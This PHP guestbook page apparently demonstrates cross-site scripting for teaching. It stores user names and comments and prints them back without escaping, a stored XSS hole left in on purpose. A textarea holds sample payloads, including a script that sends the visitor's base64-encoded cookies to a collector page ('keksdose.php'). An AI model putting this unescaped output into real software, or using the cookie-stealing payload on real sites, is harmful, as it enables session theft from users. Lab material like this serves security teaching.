<?php
   session_start();
   $file = 'xss_entries.csv';

   if ($_POST) {
      $username = $_POST['username'];
      $content = $_POST['content'];

      if ($username && $content) {
         $fp = fopen($file, 'a');
         $values = array($username, $content, time());
         fputcsv($fp, $values);
         fclose($fp);
      }
   }
?>

<!DOCTYPE html>
<html>
<head>
   <meta charset="utf-8">
   <title>Cross-Site Scripting</title>
   <link rel="stylesheet" href="css/bootstrap.min.css">
   <link rel="stylesheet" href="css/XSS.css">
</head>

<body>

   <div class="container">
      <div class="row">
         <div class="main">
            <div class="panel panel-primary">
               <div class="panel-heading">
                  <h3 class="panel-title">Sag uns deine Meinung</h3>
               </div>
               <div class="panel-body">

                  <form role="form" action="XSS.php" method="POST">
                     <div class="form-group">
                        <input type="text" class="form-control" name="username" placeholder="Name">
                     </div>
                     <div class="form-group">
                        <textarea name="content" class="form-control" rows="5" placeholder="Kommentar"></textarea>
                     </div>
                     <button type="submit" class="btn btn-primary pull-right">Abschicken</button>
                  </form>
               </div>
            </div>
         </div>

         <div class="list-group">
            <h3 class="list-group-item">Kommentare</h3>

            <?php
               $handle = fopen($file, 'r');

               while (($data = fgetcsv($handle, 1000, ",")) !== false) {
                  echo
                  '<a href="#" class="list-group-item">
                     <h3 class="list-group-item-heading">' . $data[0] . '</h3>
                     <p class="list-group-item-text">' . $data[1] . '</p>
                  </a>';
               }

               fclose($handle);
            ?>

         </div>

         <form role="form">
            <div class="form-group">
               <textarea class="form-control" rows="13" style="opacity: 0.7"><h1 style="color:hotpink">YEAH</h1>

<img src="//upload.wikimedia.org/wikipedia/meta/0/08/Wikipedia-logo-v2_1x.png" onLoad="document.body.style.backgroundColor = 'red'">

<script>
var img = document.createElement('img');
img.src = 'keksdose.php?cookie=' + btoa(document.cookie);
document.body.appendChild(img);
</script></textarea>
            </div>
         </form>

      </div>
   </div>

</body>
</html>